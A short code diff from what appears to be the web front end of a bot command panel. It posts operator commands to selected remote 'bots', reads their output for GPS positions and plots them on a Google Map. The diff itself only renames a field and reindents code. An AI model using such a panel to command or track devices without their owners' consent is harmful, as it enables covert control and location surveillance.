@@ -82,7 +82,7 @@ google.maps.event.addDomListener(window, 'load', init_map);
           return;
         }
         $(".bot:checked").each(function(){
-            $.post("../api/push", {'bot': $(this).attr('id'), 'cmd': $('#cmd').val()});
+            $.post("../api/push", {'botid': $(this).attr('id'), 'cmd': $('#cmd').val()});
         });
         $('#cmd').val('');
         return false;
@@ -92,8 +92,8 @@ google.maps.event.addDomListener(window, 'load', init_map);
 	function get_gps(id) {
 		var result = null;
 		$.ajax({url: "../api/stdout?botid="+id,type: 'get',dataType: 'html',async: false,success: function(data) {
-            		result = data;
-        	}});
+            	result = data;
+        }});
 		if(result!="") {
 			return result;
 		} else {
@@ -106,9 +106,9 @@ google.maps.event.addDomListener(window, 'load', init_map);
 
 	function init_map() {
         map = new google.maps.Map(document.getElementById('map'), {
-          zoom: 4,
-          center: {lat: 47.079194, lng:2.398245},
-	  styles: [{"featureType":"all","elementType":"all","stylers":[{"invert_lightness":true},{"saturation":20},{"lightness":50},{"gamma":0.4},{"hue":"#00ffee"}]},{"featureType":"all","elementType":"geometry","stylers":[{"visibility":"simplified"}]},{"featureType":"all","elementType":"labels","stylers":[{"visibility":"on"}]},{"featureType":"administrative","elementType":"all","stylers":[{"color":"#ffffff"},{"visibility":"simplified"}]},{"featureType":"administrative.land_parcel","elementType":"geometry.stroke","stylers":[{"visibility":"simplified"}]},{"featureType":"landscape","elementType":"all","stylers":[{"color":"#405769"}]},{"featureType":"water","elementType":"geometry.fill","stylers":[{"color":"#232f3a"}]}]
+			zoom: 4,
+			center: {lat: 47.079194, lng:2.398245},
+			styles: [{"featureType":"all","elementType":"all","stylers":[{"invert_lightness":true},{"saturation":20},{"lightness":50},{"gamma":0.4},{"hue":"#00ffee"}]},{"featureType":"all","elementType":"geometry","stylers":[{"visibility":"simplified"}]},{"featureType":"all","elementType":"labels","stylers":[{"visibility":"on"}]},{"featureType":"administrative","elementType":"all","stylers":[{"color":"#ffffff"},{"visibility":"simplified"}]},{"featureType":"administrative.land_parcel","elementType":"geometry.stroke","stylers":[{"visibility":"simplified"}]},{"featureType":"landscape","elementType":"all","stylers":[{"color":"#405769"}]},{"featureType":"water","elementType":"geometry.fill","stylers":[{"color":"#232f3a"}]}]
         });
 		refresh_map();
 	}
